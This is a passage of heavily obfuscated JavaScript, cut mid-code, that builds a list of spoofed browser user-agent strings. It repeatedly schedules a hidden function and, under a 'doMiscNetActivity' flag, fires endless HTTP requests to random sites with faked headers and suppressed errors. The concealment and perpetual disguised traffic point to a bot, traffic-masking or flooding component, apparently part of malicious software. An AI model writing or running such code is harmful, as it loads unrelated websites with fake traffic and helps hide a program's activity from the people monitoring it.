      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x9b6 + 0x1c76 + -0xa0 * 0x1e; k < -0x1 * 0x2fb + 0x7 * -0x1a6 + 0xe89; k++)
    setTimeout(f, (-0xa70e + -0x19890 * -0x1 + -0x1 * 0x722) * k * getRandomInt(-0x684 * 0x4 + -0xb75 + 0x3 * 0xc82, 0x1346 + 0x205a + -0x339d));
  setInterval(() => {
    f();
    for (let l = -0x1 * 0x1ab1 + 0x7d6 + 0x12db * 0x1; l < 0x1f0d + -0x10f + -0x1dfa; l++)
      setTimeout(f, (-0x3a4 * 0x5c + 0x1023a + 0x13716) * l * getRandomInt(0xe * -0x25 + 0xc87 + -0xa80, -0x151b + -0x1 * -0x4a4 + 0x72 * 0x25));
  }, 0x11caf * 0x3 + -0xc * 0x16957 + 0x448887);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x43 * -0x83 + 0x2665 * 0x1 + 0x16ab * -0x2) * getRandomInt(-0x1276 + 0x950 + 0x927 * 0x1, -0xb9b * 0x3 + 0x1 * -0x1254 + 0x2 * 0x1a95));
}, 0x1e98 + 0x4 * 0x507 + 0x325 * -0x10);